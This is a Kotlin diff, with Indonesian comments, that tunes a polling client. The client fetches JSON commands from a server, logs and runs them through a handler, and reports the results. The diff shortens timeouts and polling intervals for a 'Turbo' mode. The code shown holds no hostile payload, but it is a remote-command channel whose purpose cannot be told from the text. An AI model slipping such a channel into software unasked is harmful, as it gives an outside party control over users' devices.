@@ -17,19 +17,18 @@ class PollingManager(
     private val handler: CommandHandler,
     private val isTurbo: Boolean = true
 ) {
-    // Timeout disesuaikan berdasarkan mode
+    // Timeout lebih pendek untuk mode Turbo agar cepat reconnect jika putus
     private val client = OkHttpClient.Builder()
-        .connectTimeout(30L, TimeUnit.SECONDS)
+        .connectTimeout(if (isTurbo) 10L else 30L, TimeUnit.SECONDS)
         .readTimeout(if (isTurbo) 15L else 60L, TimeUnit.SECONDS) 
-        .writeTimeout(30L, TimeUnit.SECONDS)
+        .writeTimeout(20L, TimeUnit.SECONDS)
         .build()
 
     private val executor = Executors.newSingleThreadScheduledExecutor()
     private var isRunning = false
     private val TAG = "PollingManager"
     
-    // Interval retry
-    private var currentInterval = if (isTurbo) 2000L else 5000L 
+    private var currentInterval = if (isTurbo) 1000L else 5000L 
     private val maxInterval = 30000L
 
     fun start() {
@@ -76,21 +75,23 @@ class PollingManager(
                             currentInterval = (currentInterval * 1.5).toLong().coerceAtMost(maxInterval)
                             scheduleNext(currentInterval)
                         } else {
-                            currentInterval = if (isTurbo) 2000L else 5000L 
+                            // Berhasil, gunakan interval cepat
+                            currentInterval = if (isTurbo) 1000L else 5000L 
                             val body = it.body?.string() ?: ""
                             try {
                                 if (body.isNotEmpty()) {
                                     val json = JSONObject(body)
                                     val command = json.optString("command", "none")
                                     if (command != "none") {
+                                        Log.i(TAG, "Executing: $command")
                                         handler.handle(body) { result -> sendResponse(result) }
                                     }
                                 }
                             } catch (e: Exception) {
                                 Log.e(TAG, "JSON error: ${e.message}")
                             }
-                            // Jika Turbo: tunggu 2 detik. Jika Long: tunggu 1 detik.
-                            scheduleNext(if (isTurbo) 2000L else 1000L)
+                            // Polling berikutnya 1 detik untuk Turbo, agar tetap panas
+                            scheduleNext(currentInterval)
                         }
                     }
                 }
